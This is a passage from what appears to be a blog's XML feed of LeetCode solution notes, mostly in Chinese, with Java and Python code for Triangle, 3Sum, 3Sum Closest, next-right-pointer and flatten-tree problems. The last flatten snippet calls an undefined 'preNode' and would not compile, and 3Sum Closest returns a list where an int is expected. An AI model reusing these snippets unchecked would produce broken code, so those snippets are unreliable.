<p>The minimum path sum from top to bottom is <code>11</code> (i.e., 2 + 3 + 5 + 1 = 11).</p>
<p><strong>Note</strong>: Bonus point if you are able to do this using only $O(n)$ extra space, where $n$ is the total number of rows in the triangle.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>动态规划，关键是寻找最小路径和之间的关系：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minimumTotal</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; triangle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (triangle == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> m = triangle.size();</span><br><span class="line">    <span class="keyword">int</span> [][] pathSum = <span class="keyword">new</span> <span class="keyword">int</span>[m][m];  </span><br><span class="line">    <span class="comment">// initialize</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">        pathSum[m - <span class="number">1</span>][j] = triangle.get(m - <span class="number">1</span>).get(j);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = m - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</span><br><span class="line">            pathSum[i][j] = triangle.get(i).get(j) +</span><br><span class="line">                     Math.min(pathSum[i + <span class="number">1</span>][j], pathSum[i + <span class="number">1</span>][j + <span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> pathSum[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目还提到了能不能把算法优化到$O(n)$的空间复杂度。观察</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pathSum[i][j] = triangle.get(i).get(j) + Math.min(pathSum[i + <span class="number">1</span>][j], pathSum[i + <span class="number">1</span>][j + <span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
<p>等式左边总是第i行，右边总是i+1行，所以更新不重叠，只需要一个一维数组就行了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minimumTotal</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; triangle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (triangle == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> m = triangle.size();</span><br><span class="line">    <span class="keyword">int</span> [] pathSum = <span class="keyword">new</span> <span class="keyword">int</span>[m];  </span><br><span class="line">    <span class="comment">// initialize</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">        pathSum[j] = triangle.get(m - <span class="number">1</span>).get(j);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = m - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</span><br><span class="line">            pathSum[j] = triangle.get(i).get(j) + Math.min(pathSum[j], pathSum[j + <span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> pathSum[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[15. 3Sum]]></title>
      <url>/wiki/2017/10/30/Leetcode-15-3-Sum/</url>
      <content type="html"><![CDATA[<p>Given an array $S$ of $n$ integers, are there elements $a, b, c$ in $S$ such that $a + b + c = 0$? Find all unique triplets in the array which gives the sum of zero.</p>
<p>给出一个有$n$个整数的数组$S$，在$S$中找到三个整数$a, b, c$，找到所有使得$a + b + c = 0$的三元组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">For example, given array S = [-1, 0, 1, 2, -1, -4],</span><br><span class="line"></span><br><span class="line">A solution set is:</span><br><span class="line">[</span><br><span class="line">  [-1, 0, 1],</span><br><span class="line">  [-1, -1, 2]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>求一个列表中所有和为零的二元组的一种思路是先把列表排序，再用两个指针从两头向中间移动。如果前后两个数的和小于0，则左指针右移；如果和大于0，则右指针左移。求三元组时可以参考这种做法，第一个数a确定后，可以理解为求列表中和为-a的二元组。由于不要考虑重复的元组，遇到重复的数可以直接跳过。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">threeSum</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[List[int]]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        n = len(nums)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 如果为小于3个元素的列表</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">    </span><br><span class="line">        <span class="comment"># 排序</span></span><br><span class="line">        nums = sorted(nums)</span><br><span class="line">        print(nums)</span><br><span class="line">        </span><br><span class="line">        results = []</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; n<span class="number">-2</span>:</span><br><span class="line">            left = i+<span class="number">1</span></span><br><span class="line">            right = len(nums)<span class="number">-1</span></span><br><span class="line">            <span class="keyword">while</span> left &lt; right:</span><br><span class="line">                val = nums[left] + nums[right] + nums[i]</span><br><span class="line">                <span class="keyword">if</span> val == <span class="number">0</span>:</span><br><span class="line">                    results.append([nums[i], nums[left], nums[right]])</span><br><span class="line">                    print([i, left , right], [nums[i], nums[left], nums[right]])</span><br><span class="line">                    left += <span class="number">1</span></span><br><span class="line">                    right -= <span class="number">1</span></span><br><span class="line">                    <span class="comment"># Ignore repeat numbers</span></span><br><span class="line">                    <span class="keyword">while</span> (left &lt; right) <span class="keyword">and</span>  (nums[left] == nums[left<span class="number">-1</span>]):</span><br><span class="line">                        left += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span> (left &lt; right) <span class="keyword">and</span> (nums[right] == nums[right+<span class="number">1</span>]):</span><br><span class="line">                        right -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> val &lt; <span class="number">0</span>:</span><br><span class="line">                    left += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    right -= <span class="number">1</span></span><br><span class="line">                </span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="comment"># Ignore repeat numbers</span></span><br><span class="line">            <span class="keyword">while</span> i &lt; n - <span class="number">2</span> <span class="keyword">and</span> nums[i] == nums[i - <span class="number">1</span>]:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> results</span><br></pre></td></tr></table></figure>
<p>Runtime: 976 ms</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[16. 3Sum Closest]]></title>
      <url>/wiki/2017/10/30/Leetcode-16-3-Sum-Cloest/</url>
      <content type="html"><![CDATA[<p>Given an array $S$ of $n$ integers, find three integers in $S$ such that the sum is closest to a given number, target. Return the sum of the three integers. You may assume that each input would have exactly one solution.</p>
<pre><code>For example, given array S = {-1 2 1 -4}, and target = 1.

The sum that is closest to the target is 2. (-1 + 2 + 1 = 2).
</code></pre><p>这道题目和前面的3Sum问题差不多，主要是改变了target值，只要在寻找target的过程中，不断更新最接近于target的值就可以了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">threeSumClosest</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        n = len(nums)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 考虑特殊情况</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        </span><br><span class="line">        nums = sorted(nums)</span><br><span class="line">        print(nums)</span><br><span class="line">        </span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        approx_target = sys.maxsize</span><br><span class="line">        <span class="keyword">while</span> i &lt; n<span class="number">-2</span>:</span><br><span class="line">            left = i + <span class="number">1</span></span><br><span class="line">            right = n - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">                val = nums[i] + nums[left] + nums[right]</span><br><span class="line">                <span class="keyword">if</span> val == target:</span><br><span class="line">                    <span class="keyword">return</span> target</span><br><span class="line">                <span class="keyword">elif</span> abs(val-target) &lt; abs(approx_target-target):</span><br><span class="line">                        approx_target = val</span><br><span class="line">                <span class="keyword">elif</span> val &lt; target:</span><br><span class="line">                    left += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    right -= <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> approx_target</span><br></pre></td></tr></table></figure>
<p>Runtime: 136 ms, beats 97.28 %</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[117. Populating Next Right Pointers in Each Node II]]></title>
      <url>/wiki/2017/10/30/Leetcode-117-Populating-Next-Right-Pointers-in-Each-Node-II/</url>
      <content type="html"><![CDATA[<p>Given a binary tree</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeLinkNode</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  TreeLinkNode left, right, next;</span><br><span class="line">  TreeLinkNode(<span class="keyword">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Populate each next pointer to point to its next right node. If there is no next right node, the next pointer should be set to <code>NULL</code>.</p>
<p>Initially, all next pointers are set to <code>NULL</code>.</p>
<p>Note:</p>
<ul>
<li>You may only use constant extra space.</li>
<li>Recursive approach is fine, implicit stack space does not count as extra space for this problem.</li>
</ul>
<p>Example:</p>
<p>Given the following binary tree,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     1</span><br><span class="line">   /  \</span><br><span class="line">  2    3</span><br><span class="line"> / \    \</span><br><span class="line">4   5    7</span><br></pre></td></tr></table></figure>
<p>After calling your function, the tree should look like:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     1 -&gt; NULL</span><br><span class="line">   /  \</span><br><span class="line">  2 -&gt; 3 -&gt; NULL</span><br><span class="line"> / \    \</span><br><span class="line">4-&gt; 5 -&gt; 7 -&gt; NULL</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目几乎和116. Populating Next Right Pointers in Each Node一摸一样，只是去掉了条件–二叉树是完全二叉树。那么Q116中的解法1，解法2仍旧可以使用。问题是解法3可以使用吗？或者需要怎么样的更改？由于不是完全二叉树，需要增加一些判断，还需要保存每一层的开始位置，仅此而已。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">connect</span><span class="params">(TreeLinkNode root)</span> </span>&#123;</span><br><span class="line">    TreeLinkNode next_head = <span class="keyword">null</span>; <span class="comment">//head of the next level</span></span><br><span class="line">    TreeLinkNode next_prev = <span class="keyword">null</span>; <span class="comment">//the leading node on the next level</span></span><br><span class="line">    TreeLinkNode cur = root;  <span class="comment">//current node of current level</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="keyword">null</span>) &#123; <span class="comment">// travel on diff levels</span></span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="keyword">null</span>) &#123; <span class="comment">//iterate on the current level</span></span><br><span class="line">            <span class="comment">//left child</span></span><br><span class="line">            <span class="keyword">if</span> (cur.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (next_prev != <span class="keyword">null</span>) next_prev.next = cur.left;</span><br><span class="line">                <span class="keyword">else</span> next_head = cur.left;</span><br><span class="line">                next_prev = cur.left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//right child</span></span><br><span class="line">            <span class="keyword">if</span> (cur.right != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (next_prev != <span class="keyword">null</span>) next_prev.next = cur.right;</span><br><span class="line">                <span class="keyword">else</span> next_head = cur.right;</span><br><span class="line">                next_prev = cur.right;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//move to next node</span></span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// move to next level</span></span><br><span class="line">        cur = next_head;</span><br><span class="line">        next_head = <span class="keyword">null</span>;</span><br><span class="line">        next_prev = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[116. Populating Next Right Pointers in Each Node]]></title>
      <url>/wiki/2017/10/30/Leetcode-116-Populating-Next-Right-Pointers-in-Each-Node/</url>
      <content type="html"><![CDATA[<p>Given a binary tree</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeLinkNode</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  TreeLinkNode left, right, next;</span><br><span class="line">  TreeLinkNode(<span class="keyword">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Populate each next pointer to point to its next right node. If there is no next right node, the next pointer should be set to <code>NULL</code>.</p>
<p>Initially, all next pointers are set to <code>NULL</code>.</p>
<p>Note:</p>
<ul>
<li>You may only use constant extra space.</li>
<li>Recursive approach is fine, implicit stack space does not count as extra space for this problem.</li>
<li>You may assume that it is a perfect binary tree (ie, all leaves are at the same level, and every parent has two children).</li>
</ul>
<p>Example:</p>
<p>Given the following perfect binary tree,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     1</span><br><span class="line">   /  \</span><br><span class="line">  2    3</span><br><span class="line"> / \  / \</span><br><span class="line">4  5  6  7</span><br></pre></td></tr></table></figure>
<p>After calling your function, the tree should look like:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     1 -&gt; NULL</span><br><span class="line">   /  \</span><br><span class="line">  2 -&gt; 3 -&gt; NULL</span><br><span class="line"> / \  / \</span><br><span class="line">4-&gt;5-&gt;6-&gt;7 -&gt; NULL</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目是二叉树层序遍历(102. Binary Tree Level Order Traversal)的变形。在层序遍历的同时，要求每个节点的next指向右边的节点。既然二叉树的层序遍历有递归和迭代两种形式，这里也写上这两种形式。</p>
<p>迭代的形式，变量prev保存前一个遍历的节点， <code>prev.next</code>指向当前节点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">connect</span><span class="params">(TreeLinkNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    Queue&lt;TreeLinkNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    queue.offer(root);</span><br><span class="line">    TreeLinkNode cur, prev;</span><br><span class="line">    <span class="keyword">while</span>(!queue.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">int</span> size = queue.size();</span><br><span class="line">        prev = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            cur = queue.poll();</span><br><span class="line">            <span class="keyword">if</span> (prev != <span class="keyword">null</span>)</span><br><span class="line">                prev.next = cur;</span><br><span class="line">            prev = cur;</span><br><span class="line">            <span class="comment">// push nodes of the next level</span></span><br><span class="line">            <span class="keyword">if</span> (cur.left != <span class="keyword">null</span>) queue.offer(cur.left);</span><br><span class="line">            <span class="keyword">if</span> (cur.right != <span class="keyword">null</span>) queue.offer(cur.right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>递归的形式，维持一个变量<code>prev</code>为每一层的前一个遍历的节点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;TreeLinkNode&gt; prev;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">connect</span><span class="params">(TreeLinkNode root)</span> </span>&#123;</span><br><span class="line">    prev = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    levelOrderTraversal(root, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">levelOrderTraversal</span><span class="params">(TreeLinkNode root, <span class="keyword">int</span> height)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (height &gt;= prev.size()) prev.add(root);</span><br><span class="line">    <span class="keyword">else</span> prev.get(height).next = root;</span><br><span class="line">    prev.set(height, root);</span><br><span class="line">    levelOrderTraversal(root.left, height + <span class="number">1</span>);</span><br><span class="line">    levelOrderTraversal(root.right, height + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最快度的方案也是最优美的方案利用了题目中的完全二叉树的提示。到目前为止，还没有利用上这一条约束。加上这一条约束以后，其实可以从左到右，从上到下依次直接连接节点：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">connect</span><span class="params">(TreeLinkNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">while</span> (root != <span class="keyword">null</span>) &#123;</span><br><span class="line">        TreeLinkNode firstNode = root;</span><br><span class="line">        <span class="keyword">while</span>(root != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 左子节点指向右子节点</span></span><br><span class="line">            <span class="keyword">if</span>(root.left != <span class="keyword">null</span>) </span><br><span class="line">                root.left.next = root.right;</span><br><span class="line">            <span class="comment">// 右子节点指向下一个(右边)节点的左节点</span></span><br><span class="line">            <span class="keyword">if</span>(root.right != <span class="keyword">null</span> &amp;&amp; root.next != <span class="keyword">null</span>) </span><br><span class="line">                root.right.next = root.next.left;</span><br><span class="line">            <span class="comment">// 往右移动</span></span><br><span class="line">            root = root.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 移动到下一层</span></span><br><span class="line">        root = firstNode.left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[114. Flatten Binary Tree to Linked List]]></title>
      <url>/wiki/2017/10/30/Leetcode-114-Flatten-Binary-Tree-to-Linked-List/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, flatten it to a linked list <strong>in-place</strong>.</p>
<p>For example, given the following tree:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   5</span><br><span class="line"> / \   \</span><br><span class="line">3   4   6</span><br></pre></td></tr></table></figure>
<p>The flattened tree should look like:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line"> \</span><br><span class="line">  2</span><br><span class="line">   \</span><br><span class="line">    3</span><br><span class="line">     \</span><br><span class="line">      4</span><br><span class="line">       \</span><br><span class="line">        5</span><br><span class="line">         \</span><br><span class="line">          6</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>把二叉树转换成链表，也就是用二叉树的右指针(<code>TreeNode.right</code>)表示链表的next指针(<code>ListNode.next</code>).根据链表的形态，进行的是先序遍历(144. Binary Tree Preorder Traversal)。那么改编一下先序遍历就可以得到所求的链表。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatten</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    stack.push(root);</span><br><span class="line">    TreeNode prevNode = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">        TreeNode cur = stack.pop();</span><br><span class="line">        <span class="keyword">if</span> (cur != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stack.push(cur.right);</span><br><span class="line">            stack.push(cur.left);</span><br><span class="line">            <span class="keyword">if</span> (prevNode != <span class="keyword">null</span>) &#123;</span><br><span class="line">                prevNode.right = cur;</span><br><span class="line">            &#125;</span><br><span class="line">            cur.left = <span class="keyword">null</span>;</span><br><span class="line">            prevNode = cur;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    preNode.right = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
